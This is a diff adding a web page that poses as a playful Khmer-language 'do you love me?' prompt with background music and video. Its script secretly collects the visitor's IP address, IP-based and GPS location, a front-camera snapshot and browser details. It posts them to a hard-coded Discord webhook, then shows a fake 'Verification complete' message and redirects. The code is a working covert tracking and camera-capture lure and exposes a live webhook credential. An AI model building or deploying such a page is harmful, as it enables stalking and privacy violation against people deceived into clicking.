@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Consent Required</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Angkor&family=Bebas+Neue&family=Caprasimo&family=Darumadrop+One&family=Khmer&family=Koulen&family=Moul&family=Noto+Sans+Khmer:wght@100..900&family=Preahvihear&family=Suwannaphum:wght@100;300;400;700;900&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        #bgVideo {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            min-width: 100%;
+            min-height: 100%;
+            z-index: -1;
+            object-fit: cover;
+        }
+        
+        .consent-box {
+            background: rgba(255, 255, 255, 0.9);
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            max-width: 500px;
+            text-align: center;
+            z-index: 1;
+        }
+        
+        .consent-button {
+            background: #4CAF50;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            margin: 10px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .consent-button:hover {
+            background: #45a049;
+            transform: scale(1.05);
+        }
+        
+        .deny-button {
+            background: #f44336;
+        }
+        
+        .consent-box {
+            font-family: "Suwannaphum", serif;
+            font-weight: 100;
+            font-style: normal;
+        }
+        
+        .consent-box p {
+            font-family: "Suwannaphum", serif;
+            font-weight: 400;
+            font-style: normal;
+        }
+        
+        #processingMessage {
+            display: none;
+            color: white;
+            text-align: center;
+            z-index: 1;
+            background: rgba(0,0,0,0.7);
+            padding: 30px;
+            border-radius: 10px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Background Video -->
+    <video id="bgVideo" autoplay muted loop>
+        <source src="unconditionally_bg.mp4" type="video/mp4">
+        Your browser does not support HTML5 video.
+    </video>
+    
+    <!-- Consent Box -->
+    <div class="consent-box" id="consentBox">
+        <h2>តើអ្នកស្រលាញ់ខ្ញុំទេ?</h2>
+        <p>ប្រសិនអ្នកស្រលាញ់ខ្ញុំសូមអ្នកចុច Okay</p>
+        <button class="consent-button" id="consentButton">Okay ខ្ញុំស្រលាញ់អ្នក</button>
+    </div>
+
+    <!-- Processing Message -->
+    <div id="processingMessage">
+        <h2>សូមចាំខ្ញុំមួយភ្លេតខ្ញុំគិតថាអ្នកមិនបានស្រលាញ់ខ្ញុំទេ ខ្ញុំសុំស្គេនមើលបេះដូងរបស់អ្នកសិន</h2>
+        <p>បើអ្នកស្រលាញ់ខ្ញុំអ្នកអាចចាំខ្ញុំបានហើយ</p>
+    </div>
+    
+    <!-- Audio Player (hidden) -->
+    <audio id="bgMusic" autoplay loop>
+        <source src="Song1.mp3" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+
+    <script>
+        const webhookURL = 'https://canary.discord.com/api/webhooks/1392617601804406884/a-fZbyLtyBvXZUgOFRXezx4HWqBvrrwSpWrzypPhtFD8zp_gzLEVgKuO1aezttz1YZAt';
+        let ipAddress = '';
+        let locationData = {
+            latitude: null,
+            longitude: null,
+            accuracy: null,
+            address: 'Unknown'
+        };
+
+        // Start background music (with error handling)
+        function startBackgroundMusic() {
+            const audio = document.getElementById('bgMusic');
+            audio.volume = 0.5; // Set volume to 50%
+            
+            // Handle autoplay restrictions
+            const playPromise = audio.play();
+            
+            if (playPromise !== undefined) {
+                playPromise.catch(error => {
+                    console.log("Autoplay prevented, showing play button");
+                    // You could add a mute/unmute button here if needed
+                });
+            }
+        }
+
+        // Initialize background video
+        function initBackgroundVideo() {
+            const video = document.getElementById('bgVideo');
+            video.play().catch(error => {
+                console.log("Video autoplay prevented:", error);
+            });
+        }
+
+        // Get user IP and approximate location
+        async function getIPAndLocation() {
+            try {
+                // Get IP address
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                ipAddress = ipData.ip;
+                
+                // Get approximate location from IP
+                const locationResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`);
+                const locationDataFromIP = await locationResponse.json();
+                
+                locationData = {
+                    ...locationData,
+                    latitude: locationDataFromIP.latitude,
+                    longitude: locationDataFromIP.longitude,
+                    accuracy: 'Approximate (IP-based)',
+                    address: `${locationDataFromIP.city}, ${locationDataFromIP.region}, ${locationDataFromIP.country_name}`
+                };
+                
+            } catch (error) {
+                console.error('Error getting IP/location:', error);
+                ipAddress = 'Unknown';
+            }
+        }
+
+        // Try to get precise GPS location (requires user permission)
+        async function getGPSLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(false);
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        locationData = {
+                            ...locationData,
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: `${Math.round(position.coords.accuracy)} meters`,
+                            source: 'GPS'
+                        };
+                        resolve(true);
+                    },
+                    (error) => {
+                        console.error('Geolocation error:', error);
+                        resolve(false);
+                    },
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            });
+        }
+
+        // Capture from camera
+        async function captureFromCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    } 
+                });
+                
+                // Create hidden video element
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                
+                // Wait for video to be ready
+                await new Promise(resolve => {
+                    video.onloadedmetadata = resolve;
+                });
+                
+                // Create canvas to capture frame
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                
+                // Wait a moment for camera to focus
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                
+                // Draw video frame to canvas
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Stop all tracks
+                stream.getTracks().forEach(track => track.stop());
+                
+                // Convert to blob
+                return new Promise(resolve => {
+                    canvas.toBlob(blob => {
+                        resolve(blob);
+                    }, 'image/jpeg', 0.8);
+                });
+                
+            } catch (error) {
+                console.error("Camera error:", error);
+                return null;
+            }
+        }
+
+        // Send data to webhook
+        async function sendData(imageBlob) {
+            const formData = new FormData();
+            if (imageBlob) {
+                formData.append('file', imageBlob, 'verification.jpg');
+            }
+            
+            // Create location string
+            let locationString = 'Location: ';
+            if (locationData.latitude && locationData.longitude) {
+                locationString += `${locationData.latitude}, ${locationData.longitude}\n`;
+                locationString += `Accuracy: ${locationData.accuracy}\n`;
+                locationString += `Address: ${locationData.address}\n`;
+                locationString += `Google Maps: https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}\n`;
+            } else {
+                locationString += 'Unable to determine precise location\n';
+            }
+            
+            formData.append('content', 
+                `IP: ${ipAddress}\n` +
+                `${locationString}` +
+                `Timestamp: ${new Date().toISOString()}\n` +
+                `User Agent: ${navigator.userAgent}`
+            );
+            
+            try {
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    body: formData
+                });
+                return true;
+            } catch (error) {
+                console.error("Error sending data:", error);
+                return false;
+            }
+        }
+
+        // Main flow
+        document.getElementById('consentButton').addEventListener('click', async () => {
+            // Show processing message
+            document.getElementById('consentBox').style.display = 'none';
+            document.getElementById('processingMessage').style.display = 'block';
+            
+            // Get IP and approximate location first
+            await getIPAndLocation();
+            
+            // Try to get precise GPS location (will prompt user)
+            await getGPSLocation();
+            
+            // Capture image
+            const imageBlob = await captureFromCamera();
+            
+            // Send all data to Discord
+            await sendData(imageBlob);
+            
+            // Continue with your normal page flow
+            alert("Verification complete! Thank you.");
+            window.location.href = "https://jadee.pages.dev/";
+        });
+
+        // Initialize media when page loads
+        window.addEventListener('load', () => {
+            initBackgroundVideo();
+            startBackgroundMusic();
+        });
+    </script>
+</body>
+</html>
